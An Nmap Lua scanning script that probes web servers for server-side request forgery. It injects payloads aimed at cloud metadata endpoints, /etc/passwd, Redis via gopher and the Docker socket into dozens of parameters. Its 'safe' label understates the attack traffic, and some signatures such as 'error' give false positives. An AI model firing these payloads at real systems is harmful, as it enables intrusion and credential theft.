local stdnse = require "stdnse"
local http = require "http"
local string = require "string"

description = [[Tests for basic Server-Side Request Forgery (SSRF) vulnerabilities. Probes multiple parameters and injection points with various internal URL schemas including metadata endpoints, file://, gopher://, and dict:// protocols.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"safe", "discovery"}

portrule = function(host, port)
    return port.protocol == "tcp" and port.state == "open" and
        (port.service == "http" or port.service == "https" or port.number == 80 or port.number == 443 or port.number == 8080)
end

local ssrf_params = {
    "url", "uri", "path", "redirect", "redirect_uri",
    "return_url", "return_uri", "next", "target",
    "endpoint", "dest", "destination", "host",
    "file", "load", "read", "page",
    "include", "template", "document", "folder",
    "image_url", "img_url", "avatar_url",
    "webhook", "callback", "callback_url",
    "data", "link", "src", "href",
    "source", "proxy", "fetch", "download",
    "stream", "resource", "request", "forward",
    "api_url", "service", "location",
}

local ssrf_payloads = {
    { name = "AWS Metadata", url = "http://169.254.169.254/latest/meta-data/" },
    { name = "GCP Metadata", url = "http://169.254.169.254/computeMetadata/v1/" },
    { name = "Azure Metadata", url = "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" },
    { name = "Localhost IPv4", url = "http://127.0.0.1:80/" },
    { name = "Localhost IPv6", url = "http://[::1]:80/" },
    { name = "Localhost DNS", url = "http://localhost:22/" },
    { name = "File protocol", url = "file:///etc/passwd" },
    { name = "File Windows", url = "file:///c:/windows/win.ini" },
    { name = "Gopher Redis", url = "gopher://localhost:6379/" },
    { name = "Dict protocol", url = "dict://localhost:11211/" },
    { name = "Internal DNS 1", url = "http://169.254.169.253/" },
    { name = "Internal DNS 2", url = "http://169.254.169.250/" },
    { name = "K8s Metadata", url = "http://10.0.0.1/" },
    { name = "K8s Kubelet", url = "http://10.0.0.1:10250/" },
    { name = "Docker Socket", url = "unix:///var/run/docker.sock:/version" },
    { name = "SMB Local", url = "file://///localhost/admin$/" },
    { name = "CRLF Test", url = "http://127.0.0.1:80/%0d%0a" },
    { name = "Redirect Test", url = "http://127.0.0.1:80/redirect" },
}

local ssrf_signatures = {
    { pattern = "169%.254%.169%.254", name = "Cloud metadata" },
    { pattern = "ami%-id", name = "AWS AMI ID" },
    { pattern = "instance%-id", name = "AWS instance ID" },
    { pattern = "root:.*:0:0:", name = "Unix passwd" },
    { pattern = "redis_version", name = "Redis version" },
    { pattern = "MongoDB", name = "MongoDB signature" },
    { pattern = "cloud%-platform", name = "GCP response" },
    { pattern = "computeMetadata", name = "GCP metadata" },
    { pattern = "azure%-api", name = "Azure response" },
    { pattern = "windows", name = "Windows path" },
    { pattern = "fonts", name = "Windows file" },
    { pattern = "docker", name = "Docker response" },
    { pattern = "error", name = "Error based" },
}

local test_paths = { "/", "/api", "/proxy", "/fetch", "/download", "/load", "/image" }
local test_methods = { "GET", "POST" }

action = function(host, port)
    local result = stdnse.output_table()
    local findings = {}
    local params_tested = 0
    local payloads_tested = 0

    for _, path in ipairs(test_paths) do
        for _, param in ipairs(ssrf_params) do
            for _, payload in ipairs(ssrf_payloads) do
                local encoded_url = payload.url:gsub(":", "%%3A"):gsub("/", "%%2F")
                local query = path .. "?" .. param .. "=" .. payload.url
                local query_encoded = path .. "?" .. param .. "=" .. encoded_url
                local queries = { query, query_encoded }

                for _, q in ipairs(queries) do
                    local ok, response = pcall(http.get, host, port, q, { timeout = 5000 })
                    if ok and response and response.status and response.body then
                        params_tested = params_tested + 1

                        for _, sig in ipairs(ssrf_signatures) do
                            if response.body:find(sig.pattern) then
                                local finding = {
                                    param = param,
                                    payload = payload.name,
                                    url = payload.url,
                                    path = path,
                                    signature = sig.name,
                                    status = response.status,
                                    body_size = #response.body,
                                }
                                table.insert(findings, finding)
                                break
                            end
                        end
                    end
                    payloads_tested = payloads_tested + 1
                end
            end
        end
    end

    if #findings == 0 then
        return stdnse.format_output(false, "No SSRF indicators detected")
    end

    result.ssrf_findings = findings
    result.findings_count = #findings
    result.params_tested = params_tested
    result.payloads_tested = payloads_tested

    local affected_params = {}
    for _, f in ipairs(findings) do
        if not affected_params[f.param] then
            affected_params[f.param] = true
        end
    end
    result.affected_parameters = {}
    for p in pairs(affected_params) do
        table.insert(result.affected_parameters, p)
    end

    return stdnse.format_output(true, result)
end
